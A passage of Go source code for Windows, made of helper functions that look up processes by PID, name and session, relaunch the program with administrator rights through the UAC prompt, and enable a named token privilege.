	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0, err
	}

	for {
		if pe.ProcessID == pid {
			return pe.ParentProcessID, nil
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			return 0, err
		}
	}
}

func processNameByPID(pid uint32) (string, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return "", err
	}

	for {
		if pe.ProcessID == pid {
			return windows.UTF16ToString(pe.ExeFile[:]), nil
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			return "", err
		}
	}
}

func relaunchAsAdministrator() (bool, error) {
	exe, err := os.Executable()
	if err != nil {
		return false, err
	}

	verb, err := windows.UTF16PtrFromString("runas")
	if err != nil {
		return false, err
	}
	file, err := windows.UTF16PtrFromString(exe)
	if err != nil {
		return false, err
	}
	params, err := windows.UTF16PtrFromString(joinArgsForShellExecute(os.Args[1:]))
	if err != nil {
		return false, err
	}

	shell32 := windows.NewLazySystemDLL("shell32.dll")
	procShellExecuteW := shell32.NewProc("ShellExecuteW")
	r1, _, e1 := procShellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(verb)),
		uintptr(unsafe.Pointer(file)),
		uintptr(unsafe.Pointer(params)),
		0,
		uintptr(1),
	)
	if r1 <= 32 {
		if e1 != nil && e1 != windows.ERROR_SUCCESS {
			return false, e1
		}
		return false, fmt.Errorf("ShellExecuteW failed with code %d", r1)
	}
	return true, nil
}

func joinArgsForShellExecute(args []string) string {
	quoted := make([]string, 0, len(args))
	for _, arg := range args {
		if strings.ContainsAny(arg, " \t\"") {
			arg = strings.ReplaceAll(arg, `"`, `\"`)
			quoted = append(quoted, `"`+arg+`"`)
			continue
		}
		quoted = append(quoted, arg)
	}
	return strings.Join(quoted, " ")
}

func currentSessionID() (uint32, error) {
	var sessionID uint32
	if err := windows.ProcessIdToSessionId(uint32(os.Getpid()), &sessionID); err != nil {
		return 0, err
	}
	return sessionID, nil
}

func findProcessInSession(target string, sessionID uint32) (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0, err
	}

	target = strings.ToLower(target)
	for {
		name := strings.ToLower(windows.UTF16ToString(pe.ExeFile[:]))
		if name == target {
			var sid uint32
			if err := windows.ProcessIdToSessionId(pe.ProcessID, &sid); err == nil && sid == sessionID {
				return pe.ProcessID, nil
			}
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			if errors.Is(err, windows.ERROR_NO_MORE_FILES) {
				break
			}
			return 0, err
		}
	}
	return 0, fmt.Errorf("%s not found in session %d", target, sessionID)
}

func enablePrivilege(name string) error {
	proc := windows.CurrentProcess()
	var token windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token); err != nil {
		return err
	}
	defer token.Close()

	namePtr, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, namePtr, &luid); err != nil {
		return err
	}
	tp := windows.Tokenprivileges{PrivilegeCount: 1, Privileges: [1]windows.LUIDAndAttributes{{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED}}}
	if err := windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil); err != nil {
		return err
	}
	if lastErr := windows.GetLastError(); lastErr == windows.ERROR_NOT_ALL_ASSIGNED {
		return lastErr
	}
	return nil
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, format+"\n", args...)
	os.Exit(1)
}

func jsonMarshal(v any) ([]byte, error) {
	return json.Marshal(v)
}

func jsonUnmarshal(data []byte, v any) error {
	return json.Unmarshal(data, v)
}
